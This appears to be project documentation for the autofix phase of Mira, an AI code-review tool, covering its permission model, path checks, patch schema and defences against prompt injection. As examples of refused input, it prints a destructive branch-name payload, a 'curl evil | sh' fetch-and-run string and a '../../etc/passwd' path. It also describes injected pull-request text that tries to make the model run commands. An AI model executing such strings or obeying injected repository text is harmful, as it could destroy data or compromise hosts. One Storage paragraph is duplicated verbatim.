# Assisted correction (Phase 5)

The review answers *what is wrong with this code?* Autofix answers a narrower,
much more dangerous question: **may Mira change it?**

Everything before this phase reads. This one writes. A wrong review comment
costs somebody thirty seconds of annoyance; a wrong commit costs a revert, a
rebase and an argument. So correction has its own domain (`mira.autofix`), its
own queue, its own permission model, and its own kill switch.

Autofix never merges anything, and it never replaces a human review.

## The three guarantees

**1. Nothing that fails writes anything.** Generation, patch application,
validation and publication are four separate steps in that order, and only the
fourth touches a repository. A failure in any of the first three leaves the
repository byte-for-byte as it was, because the repository has not been reached
yet — not because a handler caught the bad case.

**2. The default branch is never written to, and nothing is ever force-pushed.**
The target branch is compared against the repository's default before a branch
is created, before a commit is made and before a pull request is opened. A
provider that cannot *name* its default branch is refused write access
entirely. No provider method in `mira.autofix.publish` takes a `force`
parameter, and none exists to call.

**3. Mira never merges.** There is no merge call in the publish path, and
`can_merge` is declared `False` on every provider — a value in a table somebody
can read, rather than an absence somebody has to notice. A test greps the
publish module for it, so adding one later fails CI and has to be argued for in
a review.

## States

| State | Meaning |
|---|---|
| `queued` | Accepted and durable. Nothing generated, nothing written. |
| `running` | A worker holds the lease and is asking a model for a patch. |
| `validating` | A patch exists in memory and is being checked. Still nothing written. |
| `publishing` | The checks passed and a branch/commit/pull request is being created. The only state in which Mira writes. |
| `opened` | A reviewable change exists. Terminal, and the only success. |
| `failed` | This attempt failed. Retried from `available_at` while attempts remain. |
| `dead_letter` | Out of attempts, or refused for a reason retrying cannot change. Parked with the last error. |
| `cancelled` | An admin stopped it. Terminal, and never resumes. |

`opened` means *a reviewable change exists*. It never means anything merged.

## Modes

```yaml
autofix:
  mode: "off"       # off | suggest | on
```

| Mode | What happens |
|---|---|
| `off` | No request is accepted and no queued job runs. **The default.** |
| `suggest` | Generate, validate and render the patch. Writes nothing. |
| `on` | The same, plus a branch, a commit and a pull request. |

### Rolling it out

1. **`suggest`, on one repository.** Reply `@mira fix` to a review comment. The
   dashboard shows the diff Mira would have committed and the validation it
   passed. Nothing reaches the repository.
2. **Read ten of them.** The number worth knowing before turning it on is how
   many of those patches you would have merged.
3. **`on`, on that one repository**, via `autofix.repositories`. The change
   arrives as a stacked pull request somebody has to read and merge.
4. **Widen it.** Global `mode: on` once you know what it does.

The dashboard tiles carry the numbers for step 2: *ready to review* against
*gave up*, counted from the same rows in both modes, so a dry run predicts what
turning it on will do.

## Commands

On one of Mira's review comments:

```
@mira fix
```

On the pull request:

```
@mira fix all
```

Modifiers, which are *requests* rather than permissions — each is refused with
the reason when policy does not allow it:

| Modifier | Effect |
|---|---|
| `--on-branch`, `--in-place` | Commit onto the pull request's own branch instead of opening a stacked one. Needs `allow_commit_to_pr_branch`. |
| `--handoff` | Hand the work to the configured external adapter. Needs one to be configured. |

Leading dashes are optional: `fix on-branch` works too.

The reply always says what happened — accepted, refused, or partly both. A
request that produces silence is worse than one that is turned down, because
nobody can tell it apart from a broken webhook.

### `fix all` never means all

It means *the most serious open findings, up to the configured ceiling*. What
the ceiling and the severity floor exclude is listed in the reply, by finding,
with the reason. A limit that silently drops work is a limit that gets
discovered during an incident.

The order is deterministic — most severe first, then oldest first — so which
findings a limit selects does not depend on row order.

## Who may ask

A fix is written on the requester's behalf, so the permission checked is the
one it exercises: **write access on the repository**, read from the platform.

Not "is the pull request author", not "reacted to the comment", not "has a
dashboard login". Those are different questions and none of them is this one.

Checked in this order, and the order matters:

1. **Blocklist.** Before the platform is asked, so a blocked account cannot use
   `@mira fix` to make Mira call the permissions API on its behalf — and so a
   deployment that has blocked somebody does not depend on the platform being
   reachable to keep them blocked.
2. **Allowlist**, when one is set. Empty means "anyone who can already write
   here".
3. **Write permission**, read from the platform.

An unreadable permission is not a permission. A provider that cannot report one
refuses every request, with the reason.

| Platform | Read from | Counts as write |
|---|---|---|
| GitHub | `GET /repos/{o}/{r}/collaborators/{login}/permission` | `admin`, `maintain`, `write` |
| GitLab | `GET /projects/{id}/members/all` (includes inherited group membership) | access level ≥ 30 (Developer) |
| Forgejo | `GET /repos/{o}/{r}/collaborators/{login}/permission` | `owner`, `admin`, `write` |

## What gets written

### The default: a stacked pull request

Mira's own branch, Mira's own commit, Mira's own pull request — opened against
**the branch under review**, not the default branch, so merging it lands the fix
inside the pull request that produced it rather than beside it.

Branch names are deterministic:

```
mira/fix/pr-<number>/<finding-stem>[-<slugified-title>]
```

Deterministic because a retry has to land on the branch the previous attempt
created rather than beside it. The identity comes from the finding id; the
readable tail is decoration derived from a title Mira does not control, so it is
reduced to `[a-z0-9-]` and can be dropped entirely without changing which branch
this is. A title of `../../../refs/heads/main\0 --force $(rm -rf /)` produces a
branch name in `mira/fix/pr-1/`, and nothing else.

### The opt-in: a commit on the pull request's branch

`allow_commit_to_pr_branch: true`, plus `@mira fix --on-branch`. Refused
outright in two shapes:

- **The head branch is the default branch.** The one case where "commit to the
  PR branch" and "commit to the default branch" are the same act.
- **The pull request comes from a fork.** Its branch is in a repository Mira was
  never given permission to write to. Anything that cannot be determined counts
  as a fork.

### Neither: a handoff

`autofix.handoff.adapter` names an adapter and the work is described rather than
done. The built-in `comment` adapter posts an agent-ready brief on the pull
request; it integrates with nothing, needs no credentials of its own and works
on every provider. Writing a second adapter means implementing one method.

Handoff is optional in the strongest sense: the adapter name is empty by
default, nothing is imported until one is named, and every other autofix path
works with none configured.

## Limits

Everything is refused with the reason, and every size limit is measured on the
**applied result** rather than on what the model sent. Counting the edits would
let ten small ones expand into a rewritten file.

```yaml
autofix:
  max_files: 3              # per patch
  max_lines: 120            # added + deleted
  max_patch_bytes: 40000
  max_fixes_per_request: 3  # the `fix all` ceiling
  max_concurrent_jobs: 2    # in flight, per repository
  max_attempts: 2           # tries per job, then dead-letter
  max_ci_retries: 1         # regenerations driven by a red CI run
  job_timeout_seconds: 900
  max_context_bytes: 60000  # file bodies handed to the model
```

## Paths

Every path a model proposes goes through one function, and it is the only door:

- Absolute paths, drive letters and UNC paths are refused.
- `..` is refused — on the original text as well as the normalised form, so a
  path that merely round-trips through a parent directory is refused rather
  than quietly rewritten into something that looks innocent.
- NUL bytes and reserved device names are refused.
- Anything inside `.git`, `.hg` or `.svn` is refused.
- **Protected paths** are refused. The default list is the merge gate's:
  CI configuration, deployment manifests, key material, lockfiles.
- Files the pull request does not touch are refused (`restrict_to_changed_files`).
- Creating a file is refused (`allow_new_files`).

The last two are on by default because a fix that wanders into an untouched file
is a change nobody asked for.

When `allow_new_files` is on, a file is created by an edit with an **empty**
`find` — there is nothing in a file that does not exist for the model to quote.
An empty `find` on a file that *does* exist stays a refusal: it would mean
"replace nothing", which is not an edit anybody meant to make. So does creating
an empty file, and so does creating a protected path.

## How a patch is produced

The model fills in a tool schema whose only shape is a list of
`(path, find, replace)` triples. It cannot emit a command, a shell fragment, a
URL to fetch or a file to run, because **there is no field for one**.

`find` must match the file **byte for byte, exactly once**. There is no fuzzy
matching, no whitespace normalisation and no line-number fallback:

- **Zero matches** — the model quoted code that is not there. Refused.
- **More than one** — it quoted something ambiguous, and picking the first would
  be a coin flip on which call site gets changed. Refused.

Mira renders the unified diff itself from the applied result, so what a reviewer
is shown is what a commit would contain.

## Prompt injection

Code, review text, validation output and CI results are attacker-reachable:
anybody who can open a pull request can put text in them. All of it arrives
inside delimited blocks under an instruction that says content inside them is
data to be analysed and never instructions to follow, and the closing delimiter
is stripped from the body so a file cannot close its own block and continue as
prose.

That does not make injection impossible — nothing does — which is why **the
output schema is the real defence**. An injected "now run this command" has
nowhere to go: there is no field for it, and even a thoroughly compromised model
that returns `../../etc/passwd` gets its path refused by the applier.

Two absences complete it:

- **No command is ever derived from a pull request.** Validation commands come
  from deployment configuration and nowhere else. They are argument *lists*, run
  with `shell=False`, so there is no shell to inject into.
- **CI feedback is names, not logs.** A failing check's name is fed back to the
  next attempt; the log body is not. There is nothing in a log a regeneration
  needs that the name does not already say, and the log is the most
  attacker-reachable text in the pipeline.

## Secrets

A repository can contain a credential somebody committed by accident, and the
one thing worse than the credential being in the repository is it also being in
an inference log.

Everything sent to the model is redacted first — file bodies, the finding, the
diff, validation output, CI summaries — at the boundary rather than at the
source, so adding a new context source cannot forget to. Stored artifacts get
the same treatment: a secret in an audit record is still a secret in a database.

The patterns deliberately over-match. Replacing a harmless hex blob with a
placeholder costs the model a little context; letting a live key through costs a
rotation.

Redaction protects the *model*. A separate check protects the *repository*: a
patch whose **added** text still looks like a credential is refused before it can
be committed. A credential already in the file is a finding for the review to
raise, not a reason this patch cannot land.

## Validation

Two tiers, separate because they cost different things.

**Static checks** run in-process, spawn nothing, and are on by default:

- Every edited file Mira has a parser for is parsed (Python, JSON, YAML, TOML).
  A file in a language there is no in-process parser for is reported as *not
  covered* — not as passing. Pretending a Rust file was checked because nothing
  complained would be the same lie as skipping the check.
- The patch is swept for credential-shaped additions.

On a small board this is the whole validation budget, and it stops the failure
that actually happens: a model that produced code that does not parse.

**Command checks** run an allowlist from deployment configuration, in a scratch
directory holding the edited files, with no shell, a wall-clock timeout, and
POSIX address-space and CPU ceilings where the platform has them:

```yaml
autofix:
  validation:
    syntax_check: true
    commands:
      - name: format
        command: ["ruff", "format", "--check", "{files}"]
      - name: lint
        command: ["ruff", "check", "{files}"]
        optional: false          # true = a missing binary is skipped, not failed
    command_timeout_seconds: 120
    total_timeout_seconds: 600
    memory_limit_mb: 1024
    cpu_seconds: 120
    max_output_bytes: 16000
```

`{files}` expands to the patched paths. It is the only substitution there is,
and it expands to paths Mira produced.

Commands run with an environment **allowlist** (`PATH`, `HOME`, `LANG`, `TZ`,
and a few more), not the operator's environment minus a few names. A formatter
has no business inheriting the platform token, the database URL or the model API
key — and enumerating what to *remove* means every new secret added to the
deployment leaks until somebody remembers to add it to the list.

**A check that could not run never reads as a pass.** A timeout, a missing
binary and a crashed harness all block publication, because a check Mira could
not perform is not evidence.

### What the scratch workspace is, and is not

It holds the **edited files** at their repository-relative paths. It is not a
checkout.

That is enough for a formatter or a linter with a config file. It is **not**
enough for a test suite that imports the rest of the tree. A deployment that
wants a real test run points its commands at a checkout it maintains itself.

The serious verification of a fix is the CI run on the pull request it opens —
which is why the CI retry loop exists at all.

## The CI retry loop

A published fix still has to survive the repository's own build, and the build
is the only reviewer here that runs the real test suite. A red CI run on a fix's
pull request re-queues the job for one more attempt, with the failing check
names fed back as data.

Bounded twice over:

- **The count lives on the job row.** `ci_attempts` against `max_ci_attempts`
  survives a restart, a redelivered webhook and a second worker. A limit held in
  memory resets on every deploy, which is the same as having no limit on the
  install where it matters.
- **The default is one.** Then the job stops, with a reason on its own row
  saying CI rejected it and a human should look. It does not stop *silently*:
  an `opened` job with no reason reads exactly like one CI was happy with.

Discovered by sweeping rather than only by webhook. GitHub reports check
completions; GitLab and Forgejo report pipelines through events Mira does not
subscribe to. The sweep asks all three the same question through the same
`get_ci_state` the merge gate already uses, so the loop behaves identically on
every platform instead of working properly on one.

## The queue

**A table, not a broker.** No Redis, no AMQP, nothing to install. A job is a
row, a worker takes a lease on it, and the lease expiring is what makes a
crashed worker's job available again.

That is chosen, not settled for: the deployment profile this project targets is
one container on a small board, and a queue that needs a second service is a
queue that will not be running when the fix is requested.

Correctness under crash comes from the lease rather than from the loop. A worker
killed mid-job leaves a row in `running` with a deadline that then passes, and
the next poll takes it back. Nothing has to *notice* the crash, and no cleanup
handler has to run — which is what makes `SIGKILL` and a power cut behave the
same as a clean stop.

```yaml
autofix:
  inline_worker: true        # run the loop inside `mira serve`
  worker_poll_seconds: 5.0
  lease_seconds: 900.0
  retry_backoff_seconds: 60.0
```

Larger installs set `inline_worker: false` and run the loop next to the web
process:

```
mira autofix-worker --app-id … --private-key @/run/secrets/key.pem
```

Safe to run alongside the inline worker and alongside other copies of itself —
jobs are handed out by a database lease, so two workers cannot take the same one.
`--once` runs a single poll and exits, for cron-style scheduling.

The worker refuses to start when `mode` is `off` or the kill switch is on, and
without platform credentials: a worker that claims jobs it cannot run is worse
than no worker.

## Idempotency

A job's identity is `hash(platform, owner, repo, pr_number, head_sha,
finding_id, mode)`.

It **excludes** the requester and the request kind: two maintainers typing `fix`
on the same finding at the same commit want one branch between them, not two
competing ones. It **includes** the head commit and the mode, because a finding
re-raised after a push is a different fix and a commit onto the PR branch is a
different act from a stacked pull request.

Everything downstream reuses rather than duplicates:

| On a retry | What happens |
|---|---|
| The branch | Re-derived deterministically. If it exists, it is *adopted* — never reset, because resetting it is a force push under another name. |
| The commit | Skipped when the branch already carries exactly this content. A worker that committed and then died before recording the sha comes back, sees its own work, and does not commit it twice. |
| The pull request | Found by head branch and updated in place. |

## Permissions and credentials

**The reviewer does not get write access.** The review path and the correction
path use different credentials and different code. Nothing in the review grants
a write.

On GitHub the worker mints an **installation token for the one installation that
owns the repository**, looked up from the repo registry. A job whose
installation is not recorded is refused rather than signed with an app-wide
credential — which would be authority over every other customer's repositories.

On GitLab and Forgejo the token is whatever the deployment configured. Scope it
to the repositories autofix may touch.

Required scopes:

| Platform | Needs |
|---|---|
| GitHub | `contents: write`, `pull_requests: write`, `metadata: read` |
| GitLab | `api` on a project or group access token with Developer or above |
| Forgejo | `write:repository` |

## Provider capabilities

Declared, not probed — a probe costs a round trip per request and a transient
failure would silently downgrade a working install. A provider may *narrow* its
platform's declaration; it can never widen one.

| Capability | GitHub | GitLab | Forgejo |
|---|:--:|:--:|:--:|
| Create a branch | ✓ | ✓ | ✓ |
| Create a commit | ✓ | ✓ | ✓ |
| Open a pull request | ✓ | ✓ | ✓ |
| Push to the PR branch | ✓ | ✓ | ✓ |
| Read a permission | ✓ | ✓ | ✓ |
| Read the default branch | ✓ | ✓ | ✓ |
| Find an open pull request | ✓ | ✓ | ✓ |
| Read CI | ✓ | ✓ | ✓ |
| **Merge** | ✗ | ✗ | ✗ |

Declared degradations:

- **GitLab** reports project membership as a numeric access level; anything
  below Developer (30) cannot push and is refused write permission. A merge
  request whose source project differs from its target is a fork, and Mira will
  not commit into it.
- **Forgejo**'s Gitea-compatible API has no multi-file commit endpoint, so a
  multi-file patch lands as several commits on the fix branch. Declared rather
  than hidden: the branch is Mira's own and nobody has reviewed it yet, so
  several commits are untidy rather than harmful — and squashing them would mean
  a force push, which this phase does not do.
- Anything else degrades to "cannot write", with the missing capability named.

## Storage

`autofix_jobs` and `autofix_attempts` exist in SQLite and PostgreSQL with
identical columns, and the queries are written **once** in
`mira.autofix.persistence` and mixed into both stores. Parity is a property of
the code rather than a promise in a docstring.

Each backend supplies five primitives: a placeholder, a read, a write, its
spelling of "insert unless it already exists", and its spelling of "take one row
nobody else is taking". The last is separate precisely because it is the one
statement the two engines cannot share: Postgres needs `FOR UPDATE SKIP LOCKED`
to keep two workers off one row, and SQLite, which serialises writers anyway,
must not be handed syntax it does not have.

Migrations are additive. Both stores run `CREATE TABLE IF NOT EXISTS` on every
connection, so an existing database picks the tables up on the next start with
no migration step and no downtime.

On Postgres, where one table holds every repository, rows carry the **namespaced**
owner (`_{platform}/{owner}` for anything but GitHub) because that is the
spelling every read scopes on. The store's own owner therefore wins over the one
carried on the record — writing the plain owner and reading with the namespaced
scope would make a row invisible to the store that wrote it. SQLite is handed the
plain owner and its per-repository file already scopes the rows.

On Postgres, where one table holds every repository, rows carry the **namespaced**
owner (`_{platform}/{owner}` for anything but GitHub) because that is the
spelling every read scopes on. The store's own owner therefore wins over the one
carried on the record — writing the plain owner and reading with the namespaced
scope would make a row invisible to the store that wrote it. SQLite is handed the
plain owner and its per-repository file already scopes the rows.

`autofix_attempts` is append-only. The job row carries the latest state; the
attempts carry the story, which is the only thing that makes "it opened a pull
request on the third try" reviewable rather than merely true.

## Administration

**Kill switch.** `autofix.kill_switch: true` stops every repository at once —
and stops jobs that are *already queued*, not only new requests. An operator who
flips it during an incident means "no more writes", and a queue that drained
itself afterwards would make that switch a suggestion.

**Cancellation.** Admin, plus membership of `autofix.cancel_admins` when one is
set. `cancelled` is **final**, and it is made final in three places at once
because a heartbeat runs on a timer and a publish does not wait for one:

1. The state changes and the lease is cleared, so the worker's next heartbeat
   fails — and that heartbeat *cancels the running job* rather than merely
   returning. A heartbeat that only stopped renewing would leave the work
   running to completion.
2. Every other write to a job row carries `AND state <> 'cancelled'`, so a
   worker that was already generating cannot record its progress over the
   cancellation. This is in SQL rather than in the worker, because a
   read-then-write in the worker cannot win that race and an update that
   matches no row can.
3. The job's own row is re-read immediately before the first platform write. It
   is the last read before anything becomes irreversible, and it is what turns
   "the worker will stop soon" into "nothing was written".

It does **not** reach through to the platform. A job that already opened a pull
request stays `opened` and its pull request stays open — closing somebody's pull
request is not what "cancel" means, and a cancellation that could would make the
endpoint a deletion primitive.

**No route starts a fix.** Requesting one is a repository write permission, not
a dashboard session. A `POST /api/autofix/fix` would make "can log into Mira"
and "can commit to this repository" the same permission, which is the collapse
this phase exists to prevent.

## Rollback

Autofix produces exactly three kinds of artifact, and each is reversible without
Mira's help.

| To undo | Do this |
|---|---|
| One fix | Close its pull request. Delete the branch if you want it gone. |
| Every fix, right now | `autofix.kill_switch: true`. Queued jobs stop; published pull requests stay open for you to close. |
| The feature | `autofix.mode: "off"`. Nothing is accepted and nothing runs. |
| A commit already pushed to a PR branch | `git revert` it. Mira will not push there again unless somebody asks. |
| The tables | Dropping `autofix_jobs` and `autofix_attempts` is safe. Nothing else references them; they are recreated empty on the next connection. |

There is no state to unwind, because a failed job never wrote anything: that is
guarantee 1, and it is what makes rollback this short.

Downgrading the image is safe in both directions. The tables are additive and
older code simply ignores them.

## Operational notes

**Where the queue lives.** Postgres keeps one table for the install, so one
worker serves every repository. SQLite keeps a file per repository, so the loop
walks the registered repositories and polls each — the same walk the Phase 3
analytics and the Phase 4 gate history already do.

**What a poll costs when nothing is queued.** One indexed `SELECT` per
repository, over a window of at most 200 repositories. The window **rotates**:
a fixed prefix would be a starvation bug rather than a cap, since an install
with more repositories than that would poll the same slice forever and never
claim a job in any of the others. The cap only decides how long a full cycle
takes.

The CI sweep runs at most every three minutes *per queue* — one clock for the
worker would let whichever repository is polled first spend the whole interval,
and the poll order is stable, so the same repositories would never be swept. It
also runs only where there was no job to claim, so a busy queue never delays
real work to go looking for something to retry.

**Concurrency.** One job at a time per worker, deliberately. Concurrency here
would multiply model spend and platform writes on a machine that has one core,
and the ceiling that matters — how many fixes are in flight for a repository —
is enforced when the request is accepted, where it can be explained to the
person who asked.

**No remote sandbox.** There is none, and none is required. The self-hosted and
ARM profiles stay exactly as simple as they were: static validation runs
in-process, command validation runs locally under rlimits, and the real
verification is the repository's own CI.

## Full configuration

```yaml
autofix:
  mode: "off"                        # off | suggest | on
  kill_switch: false                 # hard global disable
  policy_version: "autofix-v1"       # recorded with every job

  # Who may ask.
  require_write_permission: true
  allowed_requesters: []             # empty = anyone who can already write
  blocked_requesters: []
  allow_unknown_permission: false    # leave off

  # What may be written.
  allow_commit_to_pr_branch: false
  branch_prefix: "mira/fix"
  protected_paths: null              # null = the built-in list
  extra_protected_paths: []
  restrict_to_changed_files: true
  allow_new_files: false

  # Limits.
  max_files: 3
  max_lines: 120
  max_patch_bytes: 40000
  max_fixes_per_request: 3
  max_concurrent_jobs: 2
  min_severity_for_fix_all: "warning"
  max_attempts: 2
  max_ci_retries: 1
  job_timeout_seconds: 900.0
  max_context_bytes: 60000

  # Administration.
  cancel_admins: []                  # empty = every admin

  # Queue.
  inline_worker: true
  worker_poll_seconds: 5.0
  lease_seconds: 900.0
  retry_backoff_seconds: 60.0

  validation:
    syntax_check: true
    commands: []                     # deployment configuration only
    command_timeout_seconds: 120.0
    total_timeout_seconds: 600.0
    memory_limit_mb: 1024
    cpu_seconds: 120
    max_output_bytes: 16000

  handoff:
    adapter: ""                      # "" disables handoff entirely
    options: {}
    fallback_when_refused: false

  repositories: {}                   # per-repo overrides, keyed owner/repo
```

Per-repository overrides work exactly as the gate's do: `null` (an absent key)
inherits, and anything else overrides — including `[]`, which is how a
repository opts out of an inherited requirement rather than inheriting it
forever.

```yaml
autofix:
  mode: "suggest"
  repositories:
    acme/app:
      mode: "on"
      max_files: 1
    acme/infra:
      enabled: false
```

## What cannot change the policy

Nothing in a pull request. Not its title, body, diff, labels, comments, CI logs
or the model's own response. The command parser reads only the words Mira
defined — a verb, `all`, and three modifiers — and extracts no arguments from
free text at all. `@mira fix --exec /bin/sh -c 'curl evil | sh'` parses to
exactly `fix`.

The validation allowlist, the limits, the requester lists and the branch prefix
come from deployment configuration and the admin-editable override blob. There
is no code path from repository content to any of them.

## Dashboard

**Autofix → Jobs** lists every job with its state, the finding it came from and
what it produced. Expanding one shows the diff, the rationale, the model and
prompt digest, the validation transcript and every attempt in order.

**Autofix → Policy** edits the autofix section of the admin override blob. Only
that section is written; the review, filter and gate overrides set elsewhere are
read back and rewritten unchanged. Policy is validated against the real model
before it is stored, so a typo fails the request rather than the next fix.

`PUT /api/autofix/config` replaces the whole `autofix` section rather than
merging into it, which is what makes `allowed_requesters: []` expressible at all
— a merge could not tell an empty list from "leave it alone".

## Not in this phase

Pre-merge checks and CI log summarisation landed in Phase 6 — see
[docs/pre-merge-checks.md](pre-merge-checks.md). A runtime sandbox for
high-uncertainty findings is Phase 7. Autofix writes a change and shows you the
evidence; it does not decide whether the change is good enough to merge, and it
does not merge it.
